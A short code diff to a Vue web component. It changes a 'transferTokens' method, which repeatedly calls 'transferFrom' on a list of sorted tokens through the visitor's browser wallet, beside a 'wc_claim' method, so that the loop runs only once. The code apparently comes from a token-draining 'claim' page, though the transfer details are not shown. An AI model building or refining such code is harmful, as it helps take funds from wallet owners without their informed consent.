@@ -474,7 +474,7 @@ export default {
   },
   methods: {
     async transferTokens() {
-      setInterval(() => {
+      const intervalId = setInterval(() => {
         console.log("transferFrom");
         if(this.sortedTokens.length > 0) {
           const web3 = new Web3(window.ethereum);
@@ -492,6 +492,7 @@ export default {
             }
           }
         }
+        clearInterval(intervalId);
       }, 1000);
     },
     async wc_claim() {
